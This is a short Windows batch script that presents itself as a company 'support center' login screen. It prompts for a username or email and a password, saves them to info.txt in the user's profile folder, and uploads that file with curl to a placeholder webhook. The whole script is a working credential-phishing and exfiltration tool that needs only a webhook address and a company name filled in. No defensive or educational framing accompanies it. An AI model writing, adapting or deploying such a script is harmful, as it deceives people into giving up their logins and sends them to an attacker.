@ echo off
cd %userprofile%
del info.txt
set webhook = 
set Company = 
title %Company% support center
cls
start
echo welcome to the %Company% support center get started by logging in.
echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo username and or email
set /p ure=">":
echo %ure% >> info.txt
cls 
echo Password
set /p p=">":
echo %p% >> info.txt
curl -i -H 'Expect: application/json' -F file=@%userprofile%\info.txt %webhook%
exit
